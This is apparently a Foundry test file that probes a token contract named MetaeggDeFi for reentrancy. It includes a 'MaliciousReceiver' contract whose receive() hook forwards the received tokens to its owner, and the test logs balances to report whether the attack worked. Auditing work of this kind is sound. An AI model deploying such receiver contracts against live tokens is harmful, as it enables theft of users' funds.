// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MetaeggDeFi.sol";

contract ReentrancyTest is Test {
    MetaeggDeFi token;
    address owner = address(0x1);
    address user = address(0x2);
    MaliciousReceiver malicious;
    
    function setUp() public {
        vm.startPrank(owner);
        token = new MetaeggDeFi();
        token.mint(user, 1000 ether);
        vm.stopPrank();
        
        malicious = new MaliciousReceiver(address(token));
    }

    function testTransferReentrancy() public {
        // Record initial state
        console.log("\n--- BEFORE-Trigger ---");
        uint256 userBalanceBefore = token.balanceOf(user);
        uint256 maliciousBalanceBefore = token.balanceOf(address(malicious));
        uint256 testContractBalanceBefore = token.balanceOf(address(this));
        console.log("User balance:", userBalanceBefore);
        console.log("Malicious contract balance:", maliciousBalanceBefore);
        console.log("Test contract balance:", testContractBalanceBefore);

        // Trigger transfer that may cause reentrancy
        console.log("\n--- Trigger Transfer ---");
        vm.prank(user);
        token.transfer(address(malicious), 100 ether);

        // Record post-attack state
        console.log("\n--- AFTER-Trigger ---");
        uint256 userBalanceAfter = token.balanceOf(user);
        uint256 maliciousBalanceAfter = token.balanceOf(address(malicious));
        uint256 testContractBalanceAfter = token.balanceOf(address(this));
        console.log("User balance:", userBalanceAfter);
        console.log("Malicious contract balance:", maliciousBalanceAfter);
        console.log("Test contract balance:", testContractBalanceAfter);
        
        // Perform differential analysis
        uint256 userBalanceDiff = userBalanceBefore - userBalanceAfter;
        uint256 testContractBalanceDiff = testContractBalanceAfter - testContractBalanceBefore;
        console.log("\n--- Balance Changes ---");
        console.log("User balance reduction:", userBalanceDiff);
        console.log("Test contract balance gain:", testContractBalanceDiff);
        console.log("Malicious contract balance:", maliciousBalanceAfter);

        // Determine vulnerability status
        bool reentrancySuccess = (testContractBalanceDiff == 100 ether) && (maliciousBalanceAfter == 0);
        if (reentrancySuccess) {
            console.log("--- Result: Reentrancy occured ---");
            console.log("Vulnerability Exists: Tokens were reentrantly transferred during ERC20 callback");
        } else {
            console.log("--- Result: No unexpected balances ---");
            console.log("Vulnerability not Exist: No reentrancy detected during token transfer");
        }
    }
}

contract MaliciousReceiver {
    MetaeggDeFi public token;
    bool private called = false;
    address public owner;

    constructor(address _token) public {
        token = MetaeggDeFi(_token);
        owner = msg.sender;
    }
    
    receive() external payable {
        if (!called) {
            called = true;
            token.transfer(owner, token.balanceOf(address(this)));
        }
    }
}